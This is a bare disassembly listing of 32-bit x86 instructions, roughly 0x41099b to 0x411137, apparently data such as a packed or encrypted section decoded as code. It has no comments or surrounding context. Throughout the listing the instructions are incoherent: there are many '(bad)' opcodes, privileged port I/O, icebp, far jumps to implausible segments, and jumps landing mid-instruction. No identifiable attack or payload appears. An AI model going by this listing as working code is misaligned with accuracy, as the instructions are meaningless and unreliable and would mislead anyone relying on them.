  41099b:	mov    edx,0x4af14769
  4109a0:	stc    
  4109a1:	fdiv   QWORD PTR [edx+0x705b0470]
  4109a7:	xor    ecx,ecx
  4109a9:	mov    edi,0xdeb6ad7f
  4109ae:	jmp    0x410a27
  4109b0:	cmc    
  4109b1:	and    dh,bl
  4109b3:	or     bl,BYTE PTR [ecx+0x36fc5534]
  4109b9:	jl     0x410a13
  4109bb:	(bad)  
  4109bc:	out    0xcb,al
  4109be:	rcr    BYTE PTR ds:0x2a8ab79b,0x86
  4109c5:	int    0x8a
  4109c7:	(bad)  [esi]
  4109c9:	and    al,0x8c
  4109cb:	jae    0x410a30
  4109cd:	mov    edi,0xe526ee72
  4109d2:	shr    BYTE PTR [ebx-0x4b],0x8e
  4109d6:	push   ecx
  4109d7:	in     eax,dx
  4109d8:	cli    
  4109d9:	shr    DWORD PTR [ecx+0x13],cl
  4109dc:	stos   DWORD PTR es:[edi],eax
  4109dd:	out    dx,eax
  4109de:	loop   0x4109d7
  4109e0:	mov    ds:0x1b65718d,eax
  4109e5:	out    0xf5,eax
  4109e7:	cmc    
  4109e8:	push   ss
  4109e9:	push   eax
  4109ea:	lock ja 0x41099c
  4109ed:	int3   
  4109ee:	xchg   ebp,eax
  4109ef:	jp     0x41097b
  4109f1:	in     eax,dx
  4109f2:	psrad  mm1,QWORD PTR [eax-0x2]
  4109f6:	ja     0x410a59
  4109f8:	cmp    eax,0xde0357e2
  4109fd:	xor    DWORD PTR [eax-0x3f],eax
  410a00:	bts    DWORD PTR [edi-0x17],ebx
  410a04:	scas   eax,DWORD PTR es:[edi]
  410a05:	inc    esi
  410a06:	dec    ecx
  410a07:	cmc    
  410a08:	or     eax,0x31
  410a0b:	xor    esp,edx
  410a0d:	aas    
  410a0e:	lds    edx,FWORD PTR [esi]
  410a10:	rol    DWORD PTR [ebx],1
  410a12:	mov    edx,0xafd422e4
  410a17:	popa   
  410a18:	das    
  410a19:	ret    0x2139
  410a1c:	jge    0x410a6d
  410a1e:	or     BYTE PTR [eax+esi*4],ch
  410a21:	popf   
  410a22:	icebp  
  410a23:	xchg   esi,eax
  410a24:	xor    DWORD PTR [edi+0x4a],edi
  410a27:	aaa    
  410a28:	ins    DWORD PTR es:[edi],dx
  410a29:	in     eax,0xb9
  410a2b:	cmp    al,0xa1
  410a2d:	jo     0x4109b9
  410a2f:	jmp    0xeb081b5c
  410a34:	sbb    DWORD PTR [edx-0x60],edi
  410a37:	adc    DWORD PTR ds:0xf0b7515a,ebx
  410a3d:	mov    esp,0xa5876017
  410a42:	adc    DWORD PTR [ebx+0x35],ebx
  410a45:	inc    esi
  410a46:	enter  0xa11d,0xb7
  410a4a:	imul   ebp,DWORD PTR ds:0x1a547a85,0x5a2e310c
  410a54:	and    al,0xc6
  410a56:	dec    ebx
  410a57:	out    0x21,eax
  410a59:	add    bh,BYTE PTR [ecx]
  410a5b:	stc    
  410a5c:	cmp    esp,DWORD PTR [ebx+0x3839a787]
  410a62:	dec    ecx
  410a63:	into   
  410a64:	pop    ebp
  410a65:	js     0x410aac
  410a67:	add    al,0xc4
  410a69:	xor    ecx,DWORD PTR fs:[eax+ebp*1-0x80]
  410a6e:	das    
  410a6f:	push   ebp
  410a70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a71:	enter  0x2a37,0xda
  410a75:	ret    0x7208
  410a78:	jp     0x410a4a
  410a7a:	daa    
  410a7b:	add    al,0x7b
  410a7d:	inc    eax
  410a7e:	std    
  410a7f:	pop    edi
  410a80:	xor    BYTE PTR [esi+0x72bc82e1],ah
  410a86:	or     eax,0xb0924ce9
  410a8b:	xchg   BYTE PTR [edx+0x6b],dh
  410a8e:	xor    al,0x7b
  410a90:	mov    al,0xe
  410a92:	mov    al,0xb7
  410a94:	mov    esi,0xf13bdbf1
  410a99:	cwde   
  410a9a:	je     0x410a86
  410a9c:	dec    esp
  410a9d:	or     BYTE PTR [esi+0x4f08c5f5],al
  410aa3:	in     eax,0x64
  410aa5:	data16 (bad) 
  410aa8:	mov    eax,ss
  410aaa:	inc    ebp
  410aab:	std    
  410aac:	jnp    0x410ac9
  410aae:	addr16 mov ebp,eax
  410ab1:	fidiv  WORD PTR gs:[esi+0x64129a6b]
  410ab8:	outs   dx,BYTE PTR ds:[esi]
  410ab9:	jmp    0x89ff:0x2616ae39
  410ac0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ac1:	push   eax
  410ac2:	mov    eax,ds:0x496f5cb
  410ac7:	add    eax,0xe46c0044
  410acc:	call   DWORD PTR [edi-0x7d99037c]
  410ad2:	stc    
  410ad3:	cmp    BYTE PTR [ebp+0x201363a5],dl
  410ad9:	ja     0x410b4a
  410adb:	inc    edi
  410adc:	xchg   edi,eax
  410add:	adc    eax,0x166b0cd7
  410ae2:	shl    DWORD PTR [edi+0x33cdb7b6],0xeb
  410ae9:	imul   esi,DWORD PTR [ebx],0xffffffba
  410aec:	je     0x410b12
  410aee:	mov    edx,0x7232b440
  410af3:	cmc    
  410af4:	pop    es
  410af5:	xchg   edi,eax
  410af6:	or     DWORD PTR [ebp+0x7e1edc36],edx
  410afc:	shr    DWORD PTR [edi],cl
  410afe:	push   esp
  410aff:	nop
  410b00:	sbb    eax,0x812f1069
  410b05:	test   edi,esp
  410b07:	aam    0xb6
  410b09:	sbb    eax,0x7f862191
  410b0e:	push   esp
  410b0f:	and    ebx,ecx
  410b11:	pop    ss
  410b12:	ror    DWORD PTR [esi],0x45
  410b15:	jne    0x410b4b
  410b17:	in     eax,0x78
  410b19:	adc    BYTE PTR [ebp-0x24f98d1c],0x8c
  410b20:	sar    BYTE PTR [ebx-0x1],1
  410b23:	jg     0x410b9a
  410b25:	outs   dx,DWORD PTR ds:[esi]
  410b26:	cmp    BYTE PTR [ebp+ecx*8+0x2a],bl
  410b2a:	or     DWORD PTR [esi*2+0x364ceb65],0x4278e1d6
  410b35:	retf   
  410b36:	fistp  DWORD PTR [ebx+0x6]
  410b39:	cmp    BYTE PTR ds:0xfab16bbe,dh
  410b3f:	mov    esi,0x7f81dc80
  410b44:	push   ss
  410b45:	fsubr  st(6),st
  410b47:	pop    ebx
  410b48:	mov    ds:0xd19c6447,eax
  410b4d:	jbe    0x410b89
  410b4f:	int3   
  410b50:	fdiv   QWORD PTR [ecx+0xd]
  410b53:	retf   
  410b54:	dec    esi
  410b55:	dec    eax
  410b56:	or     DWORD PTR [ebp-0x15d5c843],esp
  410b5c:	and    ecx,DWORD PTR [ecx+0x5bc49222]
  410b62:	enter  0x4847,0x38
  410b66:	push   0xb08e792a
  410b6b:	or     al,0x7c
  410b6d:	leave  
  410b6e:	sub    edi,DWORD PTR [esi-0x48b33fab]
  410b74:	mov    bh,0xfc
  410b76:	nop
  410b77:	into   
  410b78:	pop    ebp
  410b79:	xor    BYTE PTR [ebx-0x66200200],bl
  410b7f:	aaa    
  410b80:	call   edx
  410b82:	test   DWORD PTR [edi],edi
  410b84:	add    DWORD PTR [ecx],ebp
  410b86:	jge    0x410b89
  410b88:	xchg   ecx,eax
  410b89:	scas   eax,DWORD PTR es:[edi]
  410b8a:	(bad)  
  410b8b:	clc    
  410b8c:	inc    edi
  410b8d:	aas    
  410b8e:	repnz and ch,BYTE PTR [edx+0x5e4ab8a6]
  410b95:	pop    edi
  410b96:	repnz stos DWORD PTR es:[edi],eax
  410b98:	or     eax,DWORD PTR [esp+eax*4-0x74]
  410b9c:	cmp    dl,bh
  410b9e:	ds nop
  410ba0:	(bad)  
  410ba1:	and    bh,BYTE PTR [esi+0x7e]
  410ba4:	fnstenv [ebp-0x6afd17c6]
  410baa:	jle    0x410b94
  410bac:	xchg   cl,al
  410bae:	push   ss
  410baf:	and    DWORD PTR [esi],0xffffffa2
  410bb2:	push   es
  410bb3:	call   0x7ddf:0x8d4886f9
  410bba:	mov    dh,0x78
  410bbc:	push   ss
  410bbd:	sub    BYTE PTR [edx+0x1e],al
  410bc0:	sub    BYTE PTR [ecx-0x53],ch
  410bc3:	and    BYTE PTR [ebp-0x6d],dh
  410bc6:	sti    
  410bc7:	stos   DWORD PTR es:[edi],eax
  410bc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bc9:	or     eax,DWORD PTR [ebx]
  410bcb:	popf   
  410bcc:	cwde   
  410bcd:	pop    ecx
  410bce:	arpl   bx,cx
  410bd0:	aam    0x44
  410bd2:	fucomip st,st(3)
  410bd4:	xchg   ecx,eax
  410bd5:	pop    esi
  410bd6:	aaa    
  410bd7:	push   edi
  410bd8:	push   ebx
  410bd9:	and    eax,DWORD PTR [esp+edi*4+0x25]
  410bdd:	xor    dh,al
  410bdf:	mov    ch,0x8a
  410be1:	ret    
  410be2:	push   eax
  410be3:	pop    ebx
  410be4:	inc    esi
  410be5:	out    0x6f,eax
  410be7:	repnz pop esp
  410be9:	adc    al,bl
  410beb:	jae    0x410bb9
  410bed:	adc    al,0x1f
  410bef:	xchg   ebx,eax
  410bf0:	jmp    edx
  410bf2:	ret    0x6823
  410bf5:	or     cl,BYTE PTR [edx-0x5f448972]
  410bfb:	fwait
  410bfc:	xchg   ebx,eax
  410bfd:	imul   edi,DWORD PTR [ebx],0x603424ff
  410c03:	xor    al,0xfd
  410c05:	sbb    BYTE PTR [esi],0x10
  410c08:	and    BYTE PTR [ebx],0xf1
  410c0b:	pop    edx
  410c0c:	sub    al,BYTE PTR [ebx+ebp*2+0x22d66a07]
  410c13:	loop   0x410c00
  410c15:	cs mov al,0xd
  410c18:	push   eax
  410c19:	retf   
  410c1a:	adc    eax,0xe1da2f03
  410c1f:	mov    ds:0x4e803f36,eax
  410c24:	out    dx,al
  410c25:	daa    
  410c26:	daa    
  410c27:	or     ebx,ecx
  410c29:	lock xchg edx,eax
  410c2b:	or     DWORD PTR [esi+0x69],edx
  410c2e:	out    dx,al
  410c2f:	cmc    
  410c30:	sub    edx,DWORD PTR [ecx-0x10f61cc0]
  410c36:	mov    eax,0xadc3faec
  410c3b:	mov    ds:0xa4e07437,al
  410c40:	lahf   
  410c41:	and    ch,BYTE PTR ds:0xe8abbe68
  410c47:	cmp    edi,DWORD PTR [edi]
  410c49:	jno    0x410c11
  410c4b:	xor    edi,ebx
  410c4d:	ja     0x410be2
  410c4f:	add    ecx,DWORD PTR [edx-0x80]
  410c52:	ja     0x410c9f
  410c54:	inc    ecx
  410c55:	outs   dx,DWORD PTR ds:[esi]
  410c56:	cmp    eax,0x7fa78ccc
  410c5b:	sti    
  410c5c:	ins    BYTE PTR es:[edi],dx
  410c5d:	sbb    al,0x98
  410c5f:	loopne 0x410c8d
  410c61:	xlat   BYTE PTR ds:[ebx]
  410c62:	mov    bh,0x64
  410c64:	dec    esp
  410c65:	imul   ebp,DWORD PTR [ebx],0x36
  410c68:	sub    DWORD PTR [eax+eax*4+0x1c6cf034],esp
  410c6f:	jmp    0x1c449b9c
  410c74:	push   ebp
  410c75:	mov    eax,DWORD PTR [esi]
  410c77:	adc    al,0x40
  410c79:	inc    edx
  410c7a:	pop    ss
  410c7b:	jno    0x410ce6
  410c7d:	aam    0x81
  410c7f:	retf   0xbdd5
  410c82:	ret    
  410c83:	mov    dh,BYTE PTR [ecx]
  410c85:	in     al,0x1c
  410c87:	lods   eax,DWORD PTR ds:[esi]
  410c88:	mov    ch,0xf8
  410c8a:	push   cs
  410c8b:	push   eax
  410c8c:	push   es
  410c8d:	mov    eax,ds:0x27d27692
  410c92:	sub    ebx,DWORD PTR [eax]
  410c94:	adc    BYTE PTR [esi-0x698e6594],al
  410c9a:	add    esp,DWORD PTR [esi+0x6dddbf49]
  410ca0:	push   ebx
  410ca1:	xor    ebx,DWORD PTR [edx-0x2b]
  410ca4:	mov    ds:0x9f194cd2,eax
  410ca9:	xchg   BYTE PTR [ebp+ecx*4-0x6a74ae1b],bh
  410cb0:	jmp    0x12ee:0x9c5a1b47
  410cb7:	sub    DWORD PTR [edx+0x3c],ebx
  410cba:	or     bh,ah
  410cbc:	xchg   DWORD PTR [ecx-0x79b842da],esp
  410cc2:	hlt    
  410cc3:	xchg   ebx,eax
  410cc4:	jnp    0x410cea
  410cc6:	sub    dh,dh
  410cc8:	mov    edx,0x3105173d
  410ccd:	ja     0x410c8c
  410ccf:	mov    dl,0xce
  410cd1:	retf   
  410cd2:	inc    edi
  410cd3:	or     DWORD PTR [esi+0x71],ecx
  410cd6:	dec    ebp
  410cd7:	mov    esp,0x7985a521
  410cdc:	in     al,dx
  410cdd:	sbb    ch,dl
  410cdf:	imul   ecx,DWORD PTR [edx],0xe8b39246
  410ce5:	push   ss
  410ce6:	icebp  
  410ce7:	mov    dh,0xf3
  410ce9:	rcr    ecx,cl
  410ceb:	add    esi,DWORD PTR [edi-0x14ea5240]
  410cf1:	sub    edi,DWORD PTR [ecx+ebx*2+0x43]
  410cf5:	call   0xb733f24c
  410cfa:	stos   DWORD PTR es:[edi],eax
  410cfb:	in     al,dx
  410cfc:	pop    edi
  410cfd:	shl    eax,1
  410cff:	call   0x5b07e951
  410d04:	outs   dx,DWORD PTR ds:[esi]
  410d05:	xchg   esp,eax
  410d06:	(bad)  
  410d07:	lock and eax,DWORD PTR [esi-0x14c3e0e6]
  410d0e:	mov    eax,0x9985346f
  410d13:	push   ss
  410d14:	dec    ebx
  410d15:	arpl   WORD PTR [ebp-0x49],cx
  410d18:	jmp    0x69159efa
  410d1d:	add    ebp,DWORD PTR [ebx]
  410d1f:	(bad)  
  410d20:	mov    cl,0x59
  410d22:	xor    esi,DWORD PTR [esi]
  410d24:	fnstcw WORD PTR [ebp+eax*4-0x6680f08a]
  410d2b:	xchg   edx,eax
  410d2c:	call   0x1e83:0x93412eae
  410d33:	outs   dx,DWORD PTR ds:[esi]
  410d34:	pop    ds
  410d35:	aad    0xfb
  410d37:	sub    DWORD PTR [edx+0x56d2d5ab],ebp
  410d3d:	hlt    
  410d3e:	repnz mov bl,dh
  410d41:	jecxz  0x410d2c
  410d43:	sub    BYTE PTR [ecx+edx*1+0x6e],bl
  410d47:	lods   al,BYTE PTR ds:[esi]
  410d48:	js     0x410d9c
  410d4a:	mov    esi,0x5ed431b8
  410d4f:	mov    ds:0xbe5b6982,al
  410d54:	jnp    0x410d66
  410d56:	xchg   ecx,eax
  410d57:	hlt    
  410d58:	pop    ebp
  410d59:	ret    
  410d5a:	stos   DWORD PTR es:[edi],eax
  410d5b:	sub    eax,0xbdd08cdc
  410d60:	pop    esi
  410d61:	les    ebp,FWORD PTR [ebx]
  410d63:	icebp  
  410d64:	leave  
  410d65:	push   ds
  410d66:	jge    0x410da7
  410d68:	sub    DWORD PTR [edi-0x280ac5fa],edi
  410d6e:	stc    
  410d6f:	pop    edi
  410d70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d71:	jmp    DWORD PTR [edx]
  410d73:	ins    DWORD PTR es:[edi],dx
  410d74:	inc    esp
  410d75:	inc    ecx
  410d76:	pusha  
  410d77:	sbb    bl,BYTE PTR [eax]
  410d79:	xchg   edx,eax
  410d7a:	test   DWORD PTR [esp+edx*2-0x55f73a8f],esp
  410d81:	jnp    0x410dbf
  410d83:	stc    
  410d84:	or     eax,0x2ae2c174
  410d89:	add    ecx,esi
  410d8b:	fdiv   st,st(0)
  410d8d:	cs ja  0x410dc7
  410d90:	push   ss
  410d91:	sub    DWORD PTR [ebp-0x15],edx
  410d94:	add    eax,0x4b7e2ed2
  410d99:	dec    ebx
  410d9a:	sbb    BYTE PTR [ebp-0x50],al
  410d9d:	aaa    
  410d9e:	mov    ebx,0x79d02dd3
  410da3:	push   ebx
  410da4:	mov    ds:0x898ca96e,al
  410da9:	mov    bl,0x91
  410dab:	push   cs
  410dac:	dec    eax
  410dad:	pop    ds
  410dae:	push   ss
  410daf:	out    dx,eax
  410db0:	cwde   
  410db1:	push   ebp
  410db2:	cmp    BYTE PTR [ebx],cl
  410db4:	(bad)  
  410db5:	stos   BYTE PTR es:[edi],al
  410db6:	mov    DWORD PTR [edi-0x392ded8c],ebp
  410dbc:	mov    ds:0x1650e051,al
  410dc1:	pop    edi
  410dc2:	lds    ecx,FWORD PTR [ecx-0x189a47e2]
  410dc8:	jbe    0x410d6f
  410dca:	sar    BYTE PTR [edi],1
  410dcc:	pop    edi
  410dcd:	rol    BYTE PTR [esi],0x6f
  410dd0:	add    al,0xac
  410dd2:	push   0xaff4f086
  410dd7:	xor    al,0xf4
  410dd9:	es or  eax,0x49e25578
  410ddf:	mov    bh,0x3a
  410de1:	ret    
  410de2:	fild   WORD PTR [eax+ebx*2-0x41]
  410de6:	xchg   esi,eax
  410de7:	mov    ch,0x5c
  410de9:	jge    0x410d9d
  410deb:	inc    esi
  410dec:	and    eax,0xe909a2a1
  410df1:	cmp    ah,BYTE PTR [ebx-0x36]
  410df4:	sub    al,0x48
  410df6:	push   0xffffffa5
  410df8:	pop    esp
  410df9:	mov    ebp,0x1dee3e9a
  410dfe:	data16 rcl BYTE PTR [edx+0x72],1
  410e02:	std    
  410e03:	mov    ds:0x94a903ce,al
  410e08:	popf   
  410e09:	repz ror BYTE PTR [ebx+0x739eb605],cl
  410e10:	xchg   DWORD PTR [eax],eax
  410e12:	xchg   ebp,eax
  410e13:	jg     0x410e4e
  410e15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e16:	sub    BYTE PTR [edx+0x5eb2d4d3],0x35
  410e1d:	(bad)  
  410e1e:	in     eax,dx
  410e1f:	pop    edx
  410e20:	(bad)  
  410e21:	or     BYTE PTR [esi-0x31d8566f],ch
  410e27:	popa   
  410e28:	push   ebp
  410e29:	shr    BYTE PTR [edx-0x6],0xec
  410e2d:	test   BYTE PTR [ecx+0x4168283d],cl
  410e33:	jno    0x410e54
  410e35:	push   ds
  410e36:	lahf   
  410e37:	test   BYTE PTR [ebp-0x6b172800],dh
  410e3d:	jmp    0x410e33
  410e3f:	xchg   ebx,eax
  410e40:	xchg   edx,eax
  410e41:	xor    al,0xe6
  410e43:	or     BYTE PTR [esi-0x19],ch
  410e46:	mov    ds:0xd2e4880a,al
  410e4b:	mov    esp,0xa680e5d1
  410e50:	jl     0x410ded
  410e52:	pop    ecx
  410e53:	inc    ebx
  410e54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e55:	jo     0x410df5
  410e57:	or     esi,DWORD PTR [eax+0x134fd0d2]
  410e5d:	jg     0x410ed7
  410e5f:	ret    0xd788
  410e62:	sbb    ebp,DWORD PTR [edi+0x34]
  410e65:	stos   BYTE PTR es:[edi],al
  410e66:	pop    esi
  410e67:	adc    al,0xe9
  410e69:	pop    ecx
  410e6a:	enter  0x7dba,0x95
  410e6e:	dec    ecx
  410e6f:	pusha  
  410e70:	jecxz  0x410ebd
  410e72:	cli    
  410e73:	inc    edi
  410e74:	arpl   si,di
  410e76:	imul   ecx,DWORD PTR [ebx],0xffffffaf
  410e79:	out    dx,eax
  410e7a:	retf   
  410e7b:	lock idiv DWORD PTR [edi-0xc]
  410e7f:	fsub   DWORD PTR [ebp+0xd890480]
  410e85:	mov    BYTE PTR [eax+0x69],ah
  410e88:	push   edi
  410e89:	test   eax,0xc9f434f2
  410e8e:	adc    bh,bh
  410e90:	jb     0x410ea1
  410e92:	sbb    BYTE PTR [ecx+ecx*2],al
  410e95:	pushf  
  410e96:	mov    eax,0x28227e0c
  410e9b:	and    eax,0x27561548
  410ea0:	ins    BYTE PTR es:[edi],dx
  410ea1:	jb     0x410ea6
  410ea3:	(bad)  
  410ea4:	cli    
  410ea5:	pop    edi
  410ea6:	retf   0xc417
  410ea9:	popf   
  410eaa:	inc    ebp
  410eab:	cmp    esi,DWORD PTR [ebp*4-0x29948fba]
  410eb2:	add    al,0x3f
  410eb4:	fmul   DWORD PTR [ebp+0x3d]
  410eb7:	out    dx,eax
  410eb8:	retfw  
  410eba:	cmc    
  410ebb:	lea    ebx,[ebp-0x13]
  410ebe:	mov    edi,0x1213e1fe
  410ec3:	pop    ecx
  410ec4:	lock stos BYTE PTR es:[edi],al
  410ec6:	popa   
  410ec7:	gs push ebp
  410ec9:	sbb    al,BYTE PTR [ebx-0x5c]
  410ecc:	sub    BYTE PTR [ebx+0x5d],0x61
  410ed0:	loop   0x410f13
  410ed2:	jle    0x410f2a
  410ed4:	inc    ebp
  410ed5:	inc    ebp
  410ed6:	inc    edx
  410ed7:	mov    eax,0x7b8160f7
  410edc:	push   esi
  410edd:	loopne 0x410e69
  410edf:	push   ecx
  410ee0:	sbb    cl,dh
  410ee2:	enter  0xf5c0,0x73
  410ee6:	popf   
  410ee7:	adc    DWORD PTR [esi*1-0x53a53064],esp
  410eee:	ss ja  0x410f0a
  410ef1:	inc    ecx
  410ef2:	push   edx
  410ef3:	sbb    eax,0x1bfd1416
  410ef8:	popa   
  410ef9:	popa   
  410efa:	xchg   edi,eax
  410efb:	push   edi
  410efc:	sbb    bh,cl
  410efe:	into   
  410eff:	jg     0x410f4b
  410f01:	movntps XMMWORD PTR [esi-0x36],xmm4
  410f05:	retf   0xa14a
  410f08:	outs   dx,BYTE PTR ds:[esi]
  410f09:	jns    0x410eec
  410f0b:	fstp   QWORD PTR [edi+ebx*4]
  410f0e:	loopne 0x410efb
  410f10:	sub    al,0xda
  410f12:	aad    0x8a
  410f14:	pop    ebx
  410f15:	and    dl,BYTE PTR [esi]
  410f17:	pop    ebp
  410f18:	in     eax,dx
  410f19:	outs   dx,BYTE PTR ds:[esi]
  410f1a:	js     0x410f7f
  410f1c:	xor    ch,BYTE PTR [ebx-0x2c]
  410f1f:	xor    al,0xd2
  410f21:	jne    0x410f14
  410f23:	push   ds
  410f24:	iret   
  410f25:	out    dx,al
  410f26:	in     al,0x34
  410f28:	mov    eax,0xc6b43546
  410f2d:	jne    0x410ebf
  410f2f:	pop    edx
  410f30:	(bad)  
  410f31:	ds dec bp
  410f34:	ficom  DWORD PTR [ebp-0x29]
  410f37:	xor    eax,0x73b7dd5b
  410f3c:	daa    
  410f3d:	push   ebp
  410f3e:	stos   DWORD PTR es:[edi],eax
  410f3f:	dec    esp
  410f40:	ds je  0x410f9c
  410f43:	add    DWORD PTR [ebp-0x56b807ae],edi
  410f49:	(bad)  
  410f4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f4b:	push   ecx
  410f4c:	(bad)  
  410f4e:	cmp    BYTE PTR [esi-0x69],0x5
  410f52:	nop
  410f53:	jp     0x410f06
  410f55:	inc    ebx
  410f56:	pusha  
  410f57:	jg     0x410fd0
  410f59:	pop    esp
  410f5a:	jb     0x410eed
  410f5c:	jecxz  0x410ede
  410f5e:	xchg   ecx,eax
  410f5f:	cmp    al,0x4a
  410f61:	cld    
  410f62:	in     eax,dx
  410f63:	shl    BYTE PTR [ecx+0x5f115c0f],0xbc
  410f6a:	ficomp WORD PTR [ebx]
  410f6c:	cmp    eax,DWORD PTR [edi+0x64]
  410f6f:	pop    ds
  410f70:	pop    esp
  410f71:	add    al,0x3c
  410f73:	jne    0x410fa0
  410f75:	(bad)  
  410f76:	scas   al,BYTE PTR es:[edi]
  410f77:	cmc    
  410f78:	js     0x410fda
  410f7a:	xchg   bh,ch
  410f7c:	out    0xab,al
  410f7e:	mov    ds:0x440d9651,al
  410f83:	jg     0x410f2a
  410f85:	fist   DWORD PTR [edi-0x530847fc]
  410f8b:	or     al,0x95
  410f8d:	test   DWORD PTR [ebp+ebx*2-0x3949bb50],ebp
  410f94:	aaa    
  410f95:	shl    dl,1
  410f97:	push   ecx
  410f98:	lods   eax,DWORD PTR ds:[esi]
  410f99:	psubd  mm1,mm3
  410f9c:	aad    0x5
  410f9e:	fadd   QWORD PTR [eax]
  410fa0:	fmul   DWORD PTR [edx+0x60]
  410fa3:	pop    eax
  410fa4:	jb     0x410f27
  410fa6:	out    0x1c,al
  410fa8:	jl     0x410fef
  410faa:	aaa    
  410fab:	imul   ebp,DWORD PTR [ebx-0x396c67a3],0xffffffed
  410fb2:	int3   
  410fb3:	inc    eax
  410fb4:	cmp    al,0x79
  410fb6:	aad    0x15
  410fb8:	test   eax,0x586a1d3
  410fbd:	in     al,0xcb
  410fbf:	out    0x8d,al
  410fc1:	mov    eax,ds:0x1c9c4fb3
  410fc6:	push   edx
  410fc7:	push   DWORD PTR ds:0x7988cd51
  410fcd:	addr16 popa 
  410fcf:	mov    WORD PTR [esi],ds
  410fd1:	or     al,0xb6
  410fd3:	shl    BYTE PTR [edi],1
  410fd5:	scas   eax,DWORD PTR es:[edi]
  410fd6:	fwait
  410fd7:	and    eax,0x8b16ddbf
  410fdc:	jl     0x410f62
  410fde:	mov    ds:0xb9d11889,al
  410fe3:	pushf  
  410fe4:	push   edx
  410fe5:	div    DWORD PTR [edx+0xb36b2fb]
  410feb:	push   edi
  410fec:	fisub  DWORD PTR [esi+0x7d]
  410fef:	inc    esp
  410ff0:	add    al,0x70
  410ff2:	xchg   ebp,eax
  410ff3:	mov    dl,0xda
  410ff5:	push   eax
  410ff6:	inc    esp
  410ff7:	push   esp
  410ff8:	pop    esp
  410ff9:	sub    edx,DWORD PTR [eax-0x2171acd]
  410fff:	(bad)  
  411000:	mov    ebx,0x1ba3ea0b
  411005:	jg     0x410fa1
  411007:	mov    edx,0x1cf8801f
  41100c:	fs push es
  41100e:	cmp    edi,DWORD PTR ds:0x6d204ba3
  411014:	es inc ebp
  411016:	mov    ds:0xcbd7eabd,al
  41101b:	pop    es
  41101c:	sbb    DWORD PTR [eax+edi*8-0x3fae16b6],edx
  411023:	pop    ss
  411024:	xchg   esi,eax
  411025:	mov    BYTE PTR [ebx],bl
  411027:	cdq    
  411028:	data16 and al,0x6a
  41102b:	loope  0x410fbc
  41102d:	ins    DWORD PTR es:[edi],dx
  41102e:	xchg   ebx,eax
  41102f:	loopne 0x41102d
  411031:	push   es
  411032:	cmc    
  411033:	push   0xffffffe3
  411035:	scas   al,BYTE PTR es:[edi]
  411036:	pop    ds
  411037:	push   ds
  411038:	jns    0x411095
  41103a:	arpl   bp,di
  41103c:	out    dx,al
  41103d:	xor    ebp,DWORD PTR [ebp+0x3366ac23]
  411043:	std    
  411044:	outs   dx,DWORD PTR ds:[esi]
  411045:	mov    ebp,0x7d9c63c8
  41104a:	and    BYTE PTR [eax],ah
  41104c:	fcom   QWORD PTR [ecx]
  41104e:	xor    BYTE PTR [edx-0x6c230e67],0x83
  411055:	sahf   
  411056:	push   0xffffffc7
  411058:	mov    al,0xb5
  41105a:	sub    BYTE PTR [ecx],ah
  41105c:	or     eax,eax
  41105e:	loope  0x411021
  411060:	sub    ch,bl
  411062:	mov    dl,0xa4
  411064:	xchg   esp,eax
  411065:	cmp    bh,al
  411067:	outs   dx,BYTE PTR ds:[esi]
  411068:	xchg   ebx,eax
  411069:	icebp  
  41106a:	cmp    eax,0x5b064061
  41106f:	xchg   BYTE PTR [ebx],bl
  411071:	scas   eax,DWORD PTR es:[edi]
  411072:	push   es
  411073:	ss pop ds
  411075:	lock jns 0x41103f
  411078:	adc    DWORD PTR [ecx-0x1021174b],0xf0f9b0da
  411082:	push   0x5486a2a3
  411087:	imul   ecx,DWORD PTR [esi],0xffffff94
  41108a:	por    mm7,mm2
  41108d:	mov    ecx,0x38e03fd6
  411092:	jmp    0x5913:0xd277022e
  411099:	sbb    eax,0xdc91bb35
  41109e:	jl     0x4110b5
  4110a0:	sbb    dh,BYTE PTR [esi+ecx*1-0x17]
  4110a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110a5:	cmp    edx,ebp
  4110a7:	lods   al,BYTE PTR ds:[esi]
  4110a8:	push   ss
  4110a9:	xchg   BYTE PTR [edi-0x23],ch
  4110ac:	pushf  
  4110ad:	jb     0x4110bd
  4110af:	jne    0x411054
  4110b1:	(bad)  
  4110b2:	ins    DWORD PTR es:[edi],dx
  4110b3:	dec    edi
  4110b4:	aaa    
  4110b5:	out    0x71,eax
  4110b7:	sahf   
  4110b8:	or     al,0x53
  4110ba:	out    0x7d,al
  4110bc:	inc    ebx
  4110bd:	sub    ch,cl
  4110bf:	outs   dx,BYTE PTR ds:[esi]
  4110c0:	ret    0x875e
  4110c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110c4:	pop    esp
  4110c5:	mov    eax,0xf6303b13
  4110ca:	shl    BYTE PTR [eax-0x78],cl
  4110cd:	aaa    
  4110ce:	hlt    
  4110cf:	pop    edx
  4110d0:	sub    dl,BYTE PTR [eax-0x197f1f16]
  4110d6:	adc    cl,BYTE PTR [ecx-0x8]
  4110d9:	stc    
  4110da:	shl    edx,0x70
  4110dd:	xor    esi,DWORD PTR [esi+edi*8-0x2f63e62c]
  4110e4:	mov    cl,bh
  4110e6:	test   al,0xa2
  4110e8:	rcl    edi,0xf9
  4110eb:	push   cs
  4110ec:	pop    esp
  4110ed:	pop    ebp
  4110ee:	lea    ebp,[ebp-0x2afd6e22]
  4110f4:	lods   al,BYTE PTR ds:[esi]
  4110f5:	xchg   BYTE PTR [ebx],al
  4110f7:	mov    ebx,0xc8936d2
  4110fc:	mov    bl,0xe6
  4110fe:	in     eax,0xf7
  411100:	jnp    0x4110c1
  411102:	mov    ebp,0xd2d8d63a
  411107:	bound  esi,QWORD PTR [ecx]
  411109:	xchg   ebp,eax
  41110a:	call   DWORD PTR ds:0x425fc744
  411110:	ror    DWORD PTR [esi+edx*8],0xeb
  411114:	sub    DWORD PTR [edi+0x5cb76832],0x6e
  41111b:	out    0x36,al
  41111d:	push   cs
  41111e:	dec    eax
  41111f:	mov    esp,DWORD PTR [ebx+0x1d49985d]
  411125:	inc    esp
  411126:	mov    ebx,0xbccb6dac
  41112b:	mov    eax,0x84e51c40
  411130:	nop
  411131:	fwait
  411132:	enter  0xabe8,0x80
  411136:	cmc    
  411137:	jmp    0x35d91975
